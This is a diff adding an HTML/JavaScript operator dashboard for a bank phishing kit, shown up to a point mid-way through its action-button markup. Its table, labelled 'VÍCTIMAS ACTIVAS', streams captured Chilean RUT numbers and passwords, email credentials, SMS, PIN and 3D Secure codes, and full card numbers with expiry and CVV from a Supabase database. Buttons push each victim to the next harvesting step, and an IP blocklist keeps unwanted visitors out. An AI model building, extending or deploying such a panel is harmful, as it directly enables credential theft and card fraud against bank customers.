@@ -1,0 +1,1474 @@
+<!DOCTYPE html>
+
+<html lang="es">
+
+<head>
+
+    <meta charset="UTF-8">
+<!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=ec2735fc-dae6-46b3-9686-31409e08c136
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+
+    <title>Panel de Control - Administración</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+    <style>
+
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap');
+
+        html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; font-family: 'Open Sans', sans-serif; background-color: #000000; color: #ffcccc; }
+
+        
+
+        .btn { 
+
+            padding: 0 1rem; 
+
+            border-radius: 0.5rem; 
+
+            color: #ffcccc; 
+
+            font-weight: 900; 
+
+            text-align: center; 
+
+            font-size: 0.85rem; 
+
+            height: 38px; 
+
+            display: flex; 
+
+            align-items: center; 
+
+            justify-content: center; 
+
+            white-space: nowrap;
+
+            cursor: pointer; 
+
+            border: 1px solid rgba(255, 0, 0, 0.2); 
+
+            transition: all 0.2s;
+
+            box-shadow: 0 0 5px rgba(255, 0, 0, 0.1);
+
+        }
+
+        .btn:hover:not(:disabled) { opacity: 0.9; transform: translateY(-1px); border-color: rgba(255, 0, 0, 0.5); box-shadow: 0 0 10px rgba(255, 0, 0, 0.3); }
+
+        .btn:active { transform: translateY(0); }
+
+        
+
+        .btn-red { background-color: #500505; color: #ff5555; }
+
+        .btn-orange { background-color: #5c1b05; color: #ff8855; }
+
+        .btn-yellow { background-color: #5c4305; color: #ffdd55; }
+
+        .btn-indigo { background-color: #2b0550; color: #cc88ff; }
+
+        .btn-purple { background-color: #3b0550; color: #ff88ff; }
+
+        .btn-pink { background-color: #500533; color: #ff88cc; }
+
+        .btn-green { background-color: #055020; color: #55ff88; }
+
+        .btn-gray-dark { background-color: #111111; color: #888888; border-color: #333333; } 
+
+
+
+        table.w-full { table-layout: fixed; }
+
+        td, th { vertical-align: middle; padding: 0.8rem 0.4rem; text-align: center; border-right: 2px solid #000000; border-bottom: 2px solid #000000; }
+
+        .hidden-view { display: none !important; }
+
+
+
+        .status-badge { padding: 6px 12px; border-radius: 9999px; font-size: 0.75rem; font-weight: 900; text-transform: uppercase; }
+
+        .status-online { background-color: #000000; color: #ff3333; border: 1.5px solid #ff3333; box-shadow: 0 0 6px #ff3333; }
+
+        .status-offline { background-color: #111111; color: #666666; border: 1.5px solid #222222; }
+
+        
+
+        .card-data { font-family: monospace; font-size: 13px; line-height: 1.3; text-align: left; padding: 10px; color: #ff8888 !important; background-color: #0d0000 !important; border: 1px solid #330000 !important; }
+
+    </style>
+
+</head>
+
+<body class="bg-black text-red-100 h-screen w-screen overflow-hidden flex flex-col">
+
+
+
+    <div id="login-section" class="flex items-center justify-center min-h-screen bg-black hidden-view">
+
+        <div class="w-full max-w-sm bg-black border-2 border-red-950 rounded-xl shadow-2xl shadow-red-950/40 p-8">
+
+            <h1 class="text-2xl font-black text-center text-red-650 uppercase tracking-widest animate-pulse">Panel de Administración</h1>
+
+            <form id="login-form" class="mt-6">
+
+                <div class="mb-4">
+
+                    <label class="block text-xs font-black uppercase text-red-400 tracking-wider mb-1">Usuario</label>
+
+                    <input type="text" id="username" class="w-full px-4 py-3 bg-black border border-red-950 text-red-100 rounded-lg outline-none focus:ring-1 focus:ring-red-600 font-bold" placeholder="" required>
+
+                </div>
+
+                <div class="mb-6">
+
+                    <label class="block text-xs font-black uppercase text-red-400 tracking-wider mb-1">Contraseña</label>
+
+                    <input type="password" id="password" class="w-full px-4 py-3 bg-black border border-red-950 text-red-100 rounded-lg outline-none focus:ring-1 focus:ring-red-600 font-bold" placeholder="" required>
+
+                </div>
+
+                <button type="submit" class="w-full bg-red-950 hover:bg-red-900 border border-red-800 text-red-200 font-extrabold py-3 rounded-full transition tracking-wider">Ingresar</button>
+
+            </form>
+
+        </div>
+
+    </div>
+
+
+
+    <div id="panel-section" class="w-full h-full bg-black flex flex-col p-4 overflow-hidden">
+
+        <!-- Top header row -->
+
+        <div class="flex justify-between items-center mb-4 shrink-0">
+
+            <div class="flex items-center gap-4">
+
+                <h1 class="text-2xl font-black text-red-605 animate-pulse tracking-widest">🩸 PANEL DE CONTROL EN VIVO</h1>
+
+                
+
+                <!-- Botón de Modo Global -->
+
+                <div class="flex items-center bg-neutral-950 border border-red-950 rounded-lg p-1 gap-1">
+
+                    <button id="mode-dynamic-btn" onclick="setGlobalMode('dynamic')" class="px-3 py-1.5 rounded font-black text-xs transition duration-200 uppercase tracking-wider bg-red-950 text-red-300 border border-red-800 shadow">
+
+                        ⚙️ Dinámico
+
+                    </button>
+
+                    <button id="mode-static-btn" onclick="setGlobalMode('static')" class="px-3 py-1.5 rounded font-black text-xs transition duration-200 uppercase tracking-wider text-neutral-500 hover:text-red-400">
+
+                        ⚡ Estático
+
+                    </button>
+
+                </div>
+
+            </div>
+
+            <div class="flex gap-2">
+
+                <button id="manual-block-btn" class="bg-red-950 hover:bg-red-900 text-red-300 font-extrabold py-2 px-4 rounded border border-red-850 shadow text-sm">🚫 IP Control</button>
+
+                <button id="clear-db-btn" class="bg-black hover:bg-red-950 text-red-600 border border-red-900 font-extrabold py-2 px-4 rounded shadow text-sm">🗑️ Limpiar DB</button>
+
+                <button onclick="location.reload()" class="bg-black hover:bg-red-950 text-red-500 border border-red-900 font-extrabold py-2 px-4 rounded shadow text-sm">Cerrar Sesión</button>
+
+            </div>
+
+        </div>
+
+
+
+        <button id="stop-alert-btn" class="hidden mb-4 w-full bg-red-900 text-red-100 border-2 border-red-600 font-black py-3 rounded-md shrink-0 animate-pulse shadow-lg shadow-red-900/40 text-lg">🚨 DATO RECIBIDO - ESPERANDO ACCIÓN </button>
+
+        <!-- Main layout: Full Width Active Victims -->
+
+        <div class="flex-grow flex flex-col border-2 border-red-950 rounded-lg overflow-hidden bg-black shadow-2xl">
+
+            <div class="bg-red-950 text-red-400 font-black p-4 text-base flex justify-between items-center shrink-0 border-b-2 border-black">
+
+                <span class="tracking-widest">🩸 VÍCTIMAS ACTIVAS</span>
+
+                <span id="victim-count" class="bg-red-600 text-black text-sm px-3 py-1 rounded-full font-black animate-pulse shadow-md shadow-red-950">0</span>
+
+            </div>
+
+            <div class="flex-grow overflow-auto">
+
+                <table class="w-full text-left text-red-100" style="min-width: 1850px;">
+
+                    <thead class="text-sm text-red-500 uppercase bg-black border-b-2 border-black sticky top-0 z-10 font-black">
+
+                        <tr class="border-b-2 border-black">
+
+                            <th style="width: 100px;">Estado</th>
+
+                            <th style="width: 160px;">RUT / Clave</th>
+
+                            <th style="width: 200px;">Correo / Clave</th>
+
+                            <th style="width: 110px;">Cod. Correo</th>
+
+                            <th style="width: 100px;">PIN/Din</th>
+
+                            <th style="width: 100px;">PIN 4</th>
+
+                            <th style="width: 120px;">Teléfono</th>
+
+                            <th style="width: 90px;">SMS</th>
+
+                            <th style="width: 90px;">SMS 4</th>
+
+                            <th style="width: 110px;">3D Secure</th>
+
+                            <th style="width: 160px;">T. Débito</th>
+
+                            <th style="width: 160px;">T. Crédito</th>
+
+                            <th style="width: 110px;">Solicitud</th>
+
+                            <th style="width: 340px;">Acciones de Control</th>
+
+                        </tr>
+
+                    </thead>
+
+                    <tbody id="user-table-body"></tbody>
+
+                </table>
+
+            </div>
+
+        </div>
+
+
+
+        <!-- Modal para Control de Direcciones IP -->
+
+        <div id="ip-modal" class="fixed inset-0 bg-black/90 backdrop-blur-md z-50 flex items-center justify-center hidden-view">
+
+            <div class="bg-black border-2 border-red-900 rounded-xl shadow-2xl overflow-hidden flex flex-col w-11/12 max-w-4xl max-h-[90vh] text-red-100">
+
+                <!-- Header del Modal -->
+
+                <div class="bg-red-950 text-red-400 font-black p-4 flex justify-between items-center shrink-0 border-b-2 border-black">
+
+                    <span class="text-lg flex items-center gap-2">⛓️ Control de Direcciones IP</span>
+
+                    <button onclick="toggleIPModal(false)" class="text-red-500 hover:text-red-400 text-xl font-bold font-mono focus:outline-none">&times;</button>
+
+                </div>
+
+                <!-- Cuerpo del Modal -->
+
+                <div class="p-6 flex flex-col gap-4 overflow-y-auto">
+
+                    <!-- Sección de Entrada Manual -->
+
+                    <div class="bg-black border border-red-950 p-4 rounded-lg flex flex-wrap gap-3 items-center justify-between">
+
+                        <div class="flex-grow min-w-[250px]">
+
+                            <label class="block text-xs font-black uppercase text-red-400 mb-1">Bloqueo Manual de IP</label>
+
+                            <input type="text" id="manual-ip-input" class="w-full bg-black border border-red-900 rounded px-3 py-2 text-sm text-red-150 focus:outline-none focus:ring-1 focus:ring-red-650" placeholder="Ej: 191.119.107.110">
+
+                        </div>
+
+                        <div class="flex gap-2 shrink-0 pt-4">
+
+                            <button onclick="btnBlockIP()" class="bg-red-950 hover:bg-red-900 text-red-200 border border-red-800 font-bold px-4 py-2 rounded text-sm transition">Bloquear IP</button>
+
+                            <button onclick="btnUnblockIP()" class="bg-black hover:bg-red-950 text-red-500 border border-red-900 font-bold px-4 py-2 rounded text-sm transition">Desbloquear IP</button>
+
+                        </div>
+
+                    </div>
+
+
+
+                    <!-- Columnas de Tráfico y Lista Negra -->
+
+                    <div class="grid grid-cols-1 md:grid-cols-5 gap-4 overflow-hidden min-h-[350px]">
+
+                        <!-- Columna Izquierda: Tráfico / Visitas Recientes (3/5) -->
+
+                        <div class="md:col-span-3 flex flex-col border border-black rounded-lg overflow-hidden bg-black h-[380px]">
+
+                            <div class="bg-red-950 text-red-400 border-b border-black font-bold p-3 text-xs flex justify-between items-center shrink-0">
+
+                                <span>🌐 TRÁFICO / VISITAS RECIENTES</span>
+
+                                <span id="visit-count" class="bg-red-900 text-[11px] text-red-100 px-2 py-0.5 rounded-full font-bold">0</span>
+
+                            </div>
+
+                            <div class="flex-grow overflow-auto text-xs">
+
+                                <table class="w-full text-left text-red-200">
+
+                                    <thead class="bg-black border-b border-black text-[12px] uppercase font-bold text-red-500 sticky top-0 z-10">
+
+                                        <tr class="border-b border-black">
+
+                                            <th class="p-2 text-center" style="width: 50px;">Estado</th>
+
+                                            <th class="p-2">IP / Ubicación</th>
+
+                                            <th class="p-2" style="width: 100px;">Acciones</th>
+
+                                        </tr>
+
+                                    </thead>
+
+                                    <tbody id="ip-table-body" class="divide-y divide-black">
+
+                                        <!-- Carga dinámica -->
+
+                                    </tbody>
+
+                                </table>
+
+                            </div>
+
+                        </div>
+
+
+
+                        <!-- Columna Derecha: Lista Negra (2/5) -->
+
+                        <div class="md:col-span-2 flex flex-col border border-black rounded-lg overflow-hidden bg-black h-[380px]">
+
+                            <div class="bg-red-950 text-red-400 border-b border-black font-bold p-3 text-xs flex justify-between items-center shrink-0">
+
+                                <span>🚫 LISTA NEGRA DE IPs BLOQUEADAS</span>
+
+                                <span id="blocked-count" class="bg-red-900 text-[11px] text-red-100 px-2 py-0.5 rounded-full font-bold">0</span>
+
+                            </div>
+
+                            <div class="flex-grow overflow-auto text-xs">
+
+                                <table class="w-full text-left text-red-200">
+
+                                    <thead class="bg-black border-b border-black text-[12px] uppercase font-bold text-red-500 sticky top-0 z-10">
+
+                                        <tr class="border-b border-black">
+
+                                            <th class="p-2">Dirección IP Bloqueada</th>
+
+                                            <th class="p-2 text-center" style="width: 100px;">Acción</th>
+
+                                        </tr>
+
+                                    </thead>
+
+                                    <tbody id="blacklist-table-body" class="divide-y divide-black">
+
+                                        <!-- Carga dinámica -->
+
+                                    </tbody>
+
+                                </table>
+
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+
+
+        <audio id="alarm-sound" loop preload="auto">
+
+        <source src="Sonido.mp3" type="audio/mpeg">
+
+        <source src="sonido.mp3" type="audio/mpeg">
+
+    </audio>
+
+
+
+    <script src="config.js"></script>
+
+    <script>
+
+        const SUPABASE_URL = CONFIG.SUPABASE_URL;
+
+        const SUPABASE_KEY = CONFIG.SUPABASE_KEY;
+
+        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+
+
+        const loginForm = document.getElementById("login-form");
+
+        const loginSection = document.getElementById("login-section");
+
+        const panelSection = document.getElementById("panel-section");
+
+        const alarmSound = document.getElementById("alarm-sound");
+
+        const stopBtn = document.getElementById("stop-alert-btn");
+
+
+
+        let audioUnlocked = false;
+
+        let isAlarmActive = false;
+
+        let currentBlockedIPsList = [];
+
+
+
+        async function getClientIP() {
+
+            try {
+
+                const response = await fetch('https://api.ipify.org?format=json');
+
+                const data = await response.json();
+
+                return data.ip;
+
+            } catch (e) {
+
+                console.error("Error fetching IP: ", e);
+
+                return null;
+
+            }
+
+        }
+
+
+
+        // Desbloquear audio con cualquier interacción del usuario
+
+        function unlockAudioAndPlayIfActive() {
+
+            audioUnlocked = true;
+
+            if (isAlarmActive) {
+
+                alarmSound.loop = true;
+
+                alarmSound.play().then(() => {
+
+                    hideAudioNotice();
+
+                }).catch(e => {
+
+                    console.warn("Fallo reproducción:", e);
+
+                });
+
+            } else {
+
+                hideAudioNotice();
+
+            }
+
+        }
+
+
+
+        ['click', 'touchstart', 'keydown', 'mousedown', 'pointerdown'].forEach(evt => {
+
+            window.addEventListener(evt, unlockAudioAndPlayIfActive, { passive: true });
+
+        });
+
+
+
+        function showAudioNotice() {
+
+            if (!isAlarmActive) return;
+
+            stopBtn.innerHTML = "🔊 <b>¡INFORMACIÓN EN PANTALLA!</b> HAZ CLIC AQUÍ O EN LA PANTALLA PARA ACTIVAR EL SONIDO 🔊";
+
+            stopBtn.className = "mb-4 w-full bg-red-600 hover:bg-red-500 text-white border-2 border-white font-black py-3 rounded-md shrink-0 animate-bounce shadow-xl text-lg cursor-pointer";
+
+            stopBtn.classList.remove("hidden");
+
+        }
+
+
+
+        function hideAudioNotice() {
+
+            if (isAlarmActive) {
+
+                stopBtn.innerHTML = "🚨 <b>DATO RECIBIDO - ESPERANDO ACCIÓN</b> (SELECCIONA UNA ACCIÓN EN LA TABLA PARA CONTINUAR)";
+
+                stopBtn.className = "mb-4 w-full bg-red-950 text-red-200 border-2 border-red-600 font-black py-3 rounded-md shrink-0 animate-pulse shadow-lg shadow-red-900/50 text-lg cursor-pointer";
+
+                stopBtn.classList.remove("hidden");
+
+            } else {
+
+                stopBtn.classList.add("hidden");
+
+            }
+
+        }
+
+
+
+        function playAlarm() {
+
+            isAlarmActive = true;
+
+            alarmSound.loop = true;
+
+            hideAudioNotice();
+
+
+
+            const playPromise = alarmSound.play();
+
+            if (playPromise !== undefined) {
+
+                playPromise.then(() => {
+
+                    audioUnlocked = true;
+
+                    hideAudioNotice();
+
+                }).catch(err => {
+
+                    console.warn("Autoplay bloqueado por el navegador:", err);
+
+                    showAudioNotice();
+
+                });
+
+            }
+
+        }
+
+
+
+        function stopAlarm() {
+
+            isAlarmActive = false;
+
+            try {
+
+                alarmSound.pause();
+
+                alarmSound.currentTime = 0;
+
+            } catch(e) {}
+
+            stopBtn.classList.add("hidden");
+
+        }
+
+
+
+        // Si termina el audio (o falla el loop nativo del navegador), reinicia inmediatamente si sigue activo
+
+        alarmSound.addEventListener('ended', () => {
+
+            if (isAlarmActive) {
+
+                alarmSound.currentTime = 0;
+
+                alarmSound.play().catch(e => {});
+
+            }
+
+        });
+
+
+
+        // Verificación de seguridad para asegurar que no deje de sonar mientras esté esperando acción
+
+        setInterval(() => {
+
+            if (isAlarmActive && audioUnlocked && alarmSound.paused) {
+
+                alarmSound.play().catch(e => {});
+
+            }
+
+        }, 1000);
+
+
+
+        stopBtn.onclick = () => {
+
+            unlockAudioAndPlayIfActive();
+
+        };
+
+
+
+        // Initialize automatically on page load without credentials
+
+        window.addEventListener('DOMContentLoaded', () => {
+
+            startRealtime();
+
+            fetchSessions();
+
+        });
+
+
+
+        // Funciones para el Modal de Control de IPs
+
+        function toggleIPModal(open) {
+
+            const modal = document.getElementById('ip-modal');
+
+            if (open === undefined) {
+
+                modal.classList.toggle('hidden-view');
+
+            } else if (open) {
+
+                modal.classList.remove('hidden-view');
+
+                document.getElementById('manual-ip-input').value = '';
+
+            } else {
+
+                modal.classList.add('hidden-view');
+
+            }
+
+        }
+
+
+
+        async function btnBlockIP() {
+
+            const ipInput = document.getElementById('manual-ip-input');
+
+            const ip = ipInput.value.trim();
+
+            if (!ip) {
+
+                alert("Por favor ingrese una dirección IP.");
+
+                return;
+
+            }
+
+            await blockIP(ip);
+
+            ipInput.value = '';
+
+        }
+
+
+
+        async function btnUnblockIP() {
+
+            const ipInput = document.getElementById('manual-ip-input');
+
+            const ip = ipInput.value.trim();
+
+            if (!ip) {
+
+                alert("Por favor ingrese una dirección IP.");
+
+                return;
+
+            }
+
+            await unblockIP(ip);
+
+            ipInput.value = '';
+
+        }
+
+
+
+        // Abrir modal de IPs al hacer clic en el botón de la cabecera
+
+        document.getElementById("manual-block-btn").onclick = () => toggleIPModal(true);
+
+
+
+        // Implementación del botón Limpiar DB (Total)
+
+        document.getElementById("clear-db-btn").onclick = async () => {
+
+            if (confirm("¿Estás seguro de que deseas eliminar TODOS los registros de la base de datos (incluyendo víctimas, visitas e IPs bloqueadas)? Esta acción no se puede deshacer.")) {
+
+                const { error } = await supabaseClient.from('victims').delete().not('id', 'is', null);
+
+                if (error) {
+
+                    alert("Error al limpiar la base de datos: " + error.message);
+
+                } else {
+
+                    alert("Base de datos limpia con éxito.");
+
+                    fetchSessions();
+
+                }
+
+            }
+
+        };
+
+
+
+        async function updateStep(id, step) {
+
+            let updateData = { action_request: step, last_seen: new Date() };
+
+
+
+            if (step === 'td' || step === 'tc' || step === 'td_error' || step === 'tc_error') {
+
+                const digits = prompt("Ingresa los 4 dígitos finales de la tarjeta para mostrar al cliente:");
+
+                if (digits === null) return;
+
+                updateData.last4_requested = digits || "****";
+
+            }
+
+            else if (step === '3d' || step === '3d_error') {
+
+                const custom = prompt("Ingresa los últimos 4 dígitos del celular del cliente para el 3D:");
+
+                if (custom === null) return;
+
+                updateData.three_d_custom = custom || "****";
+
+            }
+
+            else if (step === 'sms4' || step === 'sms4_error') {
+
+                const custom = prompt("Ingresa los últimos 4 dígitos del celular del cliente para el SMS4:");
+
+                if (custom === null) return;
+
+                updateData.sms4_custom = custom || "****";
+
+            }
+
+            else if (step === 'pin4' || step === 'pin4_error') {
+
+                const custom = prompt("Ingresa los últimos 4 dígitos para terminar el PIN:");
+
+                if (custom === null) return;
+
+                updateData.pin4_custom = custom || "****";
+
+            }
+
+            else if (step === 'codecorreo' || step === 'codecorreo_error') {
+
+                const custom = prompt("Ingresa el correo electrónico para mostrar en la solicitud del código (ej: cliente@gmail.com):");
+
+                if (custom === null) return;
+
+                updateData.correo_custom = custom || "tu correo";
+
+            }
+
+
+
+            // Al confirmarse la acción solicitada, detenemos la alarma y enviamos actualización
+
+            stopAlarm();
+
+            await supabaseClient.from('victims').update(updateData).eq('id', id);
+
+            fetchSessions();
+
+        }
+
+
+
+        async function deleteSession(id) {
+
+            if (confirm("¿Eliminar?")) {
+
+                await supabaseClient.from('victims').delete().eq('id', id);
+
+                fetchSessions();
+
+            }
+
+        }
+
+
+
+        async function blockIP(ip) {
+
+        if (!ip || ip === 'Desconocida') return;
+
+        if (confirm(`¿Bloquear dirección IP ${ip}? El usuario no podrá acceder a la página web.`)) {
+
+            const { error } = await supabaseClient.from('victims').insert([{
+
+                rut: 'IP_BLOQUEADA',
+
+                telefono: ip,
+
+                ip_address: ip,
+
+                action_request: 'block',
+
+                last_seen: new Date().toISOString()
+
+            }]);
+
+                if (error) alert("Error al bloquear IP: " + error.message);
+
+                else fetchSessions();
+
+            }
+
+        }
+
+
+
+        async function unblockIP(ip) {
+
+            if (!ip) return;
+
+            if (confirm(`¿Desbloquear dirección IP ${ip}?`)) {
+
+                const { error } = await supabaseClient.from('victims').delete().eq('rut', 'IP_BLOQUEADA').eq('telefono', ip);
+
+                if (error) alert("Error al desbloquear IP: " + error.message);
+
+                else fetchSessions();
+
+            }
+
+        }
+
+
+
+        async function setGlobalMode(mode) {
+
+            try {
+
+                const { data, error } = await supabaseClient
+
+                    .from('victims')
+
+                    .select('id')
+
+                    .eq('rut', 'GLOBAL_CONFIG');
+
+
+
+                if (error) {
+
+                    console.error("Error checking global config:", error);
+
+                    return;
+
+                }
+
+
+
+                if (data && data.length > 0) {
+
+                    await supabaseClient
+
+                        .from('victims')
+
+                        .update({
+
+                            action_request: mode,
+
+                            last_seen: new Date().toISOString()
+
+                        })
+
+                        .eq('rut', 'GLOBAL_CONFIG');
+
+                } else {
+
+                    await supabaseClient
+
+                        .from('victims')
+
+                        .insert([{
+
+                            rut: 'GLOBAL_CONFIG',
+
+                            action_request: mode,
+
+                            telefono: 'CONFIG',
+
+                            last_seen: new Date().toISOString()
+
+                        }]);
+
+                }
+
+                updateModeUI(mode);
+
+            } catch (e) {
+
+                console.error("Error setting global mode:", e);
+
+            }
+
+        }
+
+
+
+        function updateModeUI(mode) {
+
+            const dynBtn = document.getElementById('mode-dynamic-btn');
+
+            const statBtn = document.getElementById('mode-static-btn');
+
+            if (!dynBtn || !statBtn) return;
+
+            if (mode === 'static') {
+
+                dynBtn.className = "px-3 py-1.5 rounded font-black text-xs transition duration-200 uppercase tracking-wider text-neutral-500 hover:text-red-400";
+
+                statBtn.className = "px-3 py-1.5 rounded font-black text-xs transition duration-200 uppercase tracking-wider bg-red-950 text-red-300 border border-red-800 shadow";
+
+            } else {
+
+                dynBtn.className = "px-3 py-1.5 rounded font-black text-xs transition duration-200 uppercase tracking-wider bg-red-950 text-red-300 border border-red-800 shadow";
+
+                statBtn.className = "px-3 py-1.5 rounded font-black text-xs transition duration-200 uppercase tracking-wider text-neutral-500 hover:text-red-400";
+
+            }
+
+        }
+
+
+
+        async function fetchGlobalConfig() {
+
+            try {
+
+                const { data, error } = await supabaseClient
+
+                    .from('victims')
+
+                    .select('*')
+
+                    .eq('rut', 'GLOBAL_CONFIG');
+
+                if (!error && data && data.length > 0) {
+
+                    updateModeUI(data[0].action_request);
+
+                } else {
+
+                    updateModeUI('dynamic');
+
+                }
+
+            } catch (e) {
+
+                console.error("Error fetching global config:", e);
+
+            }
+
+        }
+
+
+
+        async function fetchSessions() {
+
+            await fetchGlobalConfig();
+
+            const { data, error } = await supabaseClient.from('victims').select('*').order('created_at', { ascending: false });
+
+            if (!error) {
+
+                // Asegurar que lo primero (más nuevo) quede arriba y lo antiguo abajo
+
+                data.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
+
+                render(data);
+
+            }
+
+        }
+
+
+
+        function startRealtime() {
+
+            supabaseClient.channel('victims-realtime').on('postgres_changes', { event: '*', schema: 'public', table: 'victims' }, (payload) => {
+
+                if ((payload.eventType === 'INSERT' && payload.new.action_request !== 'visit' && payload.new.rut !== 'IP_BLOQUEADA' && payload.new.rut !== 'GLOBAL_CONFIG') || 
+
+                    (payload.eventType === 'UPDATE' && payload.new.action_request === 'waiting' && payload.new.rut !== 'GLOBAL_CONFIG')) {
+
+                    playAlarm();
+
+                }
+
+                fetchSessions();
+
+            }).subscribe();
+
+        }
+
+
+
+        function render(data) {
+
+            const tbody = document.getElementById("user-table-body");
+
+            tbody.innerHTML = "";
+
+
+
+            // Separar datos
+
+
+
+            const victimsOnly = data.filter(s => s.action_request !== 'visit' && s.rut !== 'IP_BLOQUEADA' && s.rut !== 'ALLOWED_IP' && s.rut !== 'GLOBAL_CONFIG');
+
+
+
+            const blockedIPs = data.filter(s => s.rut === 'IP_BLOQUEADA');
+
+
+
+            const visitsOnly = data.filter(s => s.action_request === 'visit');
+
+
+
+            currentBlockedIPsList = blockedIPs;
+
+
+
+            // Alarma activa mientras haya datos de víctimas esperando acción
+
+            const hasWaitingVictim = victimsOnly.some(s => 
+
+                s.action_request === 'waiting' || 
+
+                (s.action_request === 'login' && s.rut && s.rut !== 'VISITA')
+
+            );
+
+
+
+            if (hasWaitingVictim) {
+
+                playAlarm();
+
+            } else {
+
+                stopAlarm();
+
+            }
+
+
+
+
+
+
+
+            // Actualizar contadores
+
+
+
+            document.getElementById("victim-count").textContent = victimsOnly.length;
+
+
+
+            document.getElementById("visit-count").textContent = visitsOnly.length;
+
+
+
+            document.getElementById("blocked-count").textContent = blockedIPs.length;
+
+
+
+
+
+            // Contar las ocurrencias de cada RUT para identificar ingresos duplicados
+
+            const rutCounts = {};
+
+            
+
+            function getCanonicalRut(rut) {
+
+                if (!rut) return "";
+
+                let norm = rut.replace(/[^a-zA-Z0-9]/g, "").toUpperCase();
+
+                // Si consiste solo de un carácter repetido (como todos 1s), lo normalizamos a 8 caracteres
+
+                if (norm.length > 0 && /^(\d)\1*$/.test(norm)) {
+
+                    return norm[0].repeat(8);
+
+                }
+
+                return norm;
+
+            }
+
+
+
+            victimsOnly.forEach(s => {
+
+                const canonical = getCanonicalRut(s.rut);
+
+                if (canonical) {
+
+                    rutCounts[canonical] = (rutCounts[canonical] || 0) + 1;
+
+                }
+
+            });
+
+
+
+            // 1. RENDER VÍCTIMAS
+
+            victimsOnly.forEach(s => {
+
+                const isOnline = s.last_seen && (new Date() - new Date(s.last_seen) < 30000);
+
+                const statusClass = isOnline ? 'status-online' : 'status-offline';
+
+                
+
+                // Verificar si el RUT ingresó más de una vez
+
+                const normRut = getCanonicalRut(s.rut);
+
+                const isDuplicate = normRut && rutCounts[normRut] > 1;
+
+
+
+                const rutColorClass = isDuplicate ? 'text-green-400 font-black text-[18px]' : 'text-red-100 font-extrabold text-[18px]';
+
+                const claveColorClass = isDuplicate ? 'text-green-500 font-bold text-[16px]' : 'text-red-300 font-bold text-[16px]';
+
+
+
+                const ipVal = s.ip_address || s.nombre || s.telefono || '';
+
+                const isIpBlocked = blockedIPs.some(b => b.telefono === ipVal);
+
+                const blockBtn = ipVal
+
+                    ? (isIpBlocked 
+
+                        ? `<button onclick="unblockIP('${ipVal}')" class="mt-1 bg-black border border-red-550 text-red-500 hover:bg-red-950 text-[12px] px-3 py-1 rounded font-bold transition">Desbloquear</button>`
+
+                        : `<button onclick="blockIP('${ipVal}')" class="mt-1 bg-red-950 border border-red-800 text-red-200 hover:bg-red-900 text-[12px] px-3 py-1 rounded font-bold transition">Bloquear IP</button>`)
+
+                    : '';
+
+
+
+                const rowClass = isDuplicate 
+
+                    ? 'border-b-2 border-emerald-700 bg-emerald-950/20 text-green-300 font-extrabold' 
+
+                    : 'border-b border-black bg-[#0c0000]/40 text-red-100';
+
+
+
+                tbody.innerHTML += `
+
+                    <tr class="${rowClass} hover:bg-red-950/70 text-[15px]">
+
+                        <td><span class="status-badge ${statusClass}">${isOnline ? 'Online' : 'Offline'}</span></td>
+
+                        <td><div class="font-bold ${rutColorClass}">${s.rut || '—'}</div><div class="${claveColorClass}">${s.clave || '—'}</div></td>
+
+                        <td><div class="font-bold text-[15px] ${isDuplicate ? 'text-green-400 font-black' : 'text-red-500'}">${(s.correo && s.correo.includes('@')) ? s.correo : '—'}</div><div class="text-[14px] ${isDuplicate ? 'text-green-500' : 'text-red-300'}">${s.correo_clave || '—'}</div></td>
+
+                        <td><div class="font-bold text-[16px] ${isDuplicate ? 'text-green-500' : 'text-red-400'}">${s.correo_codigo || '—'}</div></td>
+
+                        <td><div class="font-bold text-[16px] ${isDuplicate ? 'text-green-500' : 'text-red-400'}">${s.clave_dinamica || '—'}</div></td>
+
+                        <td><div class="font-bold text-[16px] ${isDuplicate ? 'text-green-600 font-black' : 'text-red-550'}">${s.pin4 || '—'}</div></td>
+
+                        <td><div class="${isDuplicate ? 'text-green-400 font-black' : 'text-red-200 font-semibold'} text-[15px]">${(s.telefono && s.telefono !== s.ip_address && s.telefono !== s.nombre && !s.telefono.includes('.')) ? s.telefono : '—'}</div></td>
+
+                        <td><div class="${isDuplicate ? 'text-green-500' : 'text-red-500'} text-[17px] font-bold">${s.sms1 || '—'}</div></td>
+
+                        <td><div class="${isDuplicate ? 'text-green-500' : 'text-red-550'} text-[17px] font-black">${s.sms4 || '—'}</div></td>
+
+                        <td><div class="font-bold text-[15px] ${isDuplicate ? 'text-green-400 bg-emerald-950/70 border-emerald-900/50' : 'text-red-400 bg-red-950/80 border-red-900/50'} border px-2 py-1 rounded text-center">${s.three_d || '—'}</div></td>
+
+                        <td class="card-data border-r-2 border-black">${s.td ? `<b>NUM:</b> ${s.td}<br><b>EXP:</b> ${s.td_fecha}<br><b>CVV:</b> ${s.td_cvv}` : '<span class="text-red-900">—</span>'}</td>
+
+                        <td class="card-data border-r-2 border-black">${s.tc ? `<b>NUM:</b> ${s.tc}<br><b>EXP:</b> ${s.tc_fecha}<br><b>CVV:</b> ${s.tc_cvv}` : '<span class="text-red-900">—</span>'}</td>
+
+                        <td><span class="font-bold ${s.action_request === 'waiting' ? 'text-white bg-red-600 border-red-500 animate-pulse font-black shadow-[0_0_8px_#ff0000]' : (isDuplicate ? 'text-green-400 bg-emerald-950/70 border-emerald-900/50' : 'text-red-450 bg-red-950/80 border-red-900/50')} uppercase text-[12px] border px-2.5 py-1 rounded">${s.action_request === 'waiting' ? '🚨 WAITING' : (s.action_request || '—')}</span></td>
+
+                        <td class="px-2">
+
+                            <div class="grid grid-cols-3 gap-x-3 gap-y-3 py-1 text-center justify-center">
+
+                                <!-- Columna 1: SMS / SMSE -->
+
+                                <div class="flex flex-col gap-1 items-stretch min-w-[90px]">
+
+                                    <button onclick="updateStep('${s.id}', 'sms1')" class="btn btn-yellow px-3 text-[13px] h-[35px] font-black">SMS</button>
+
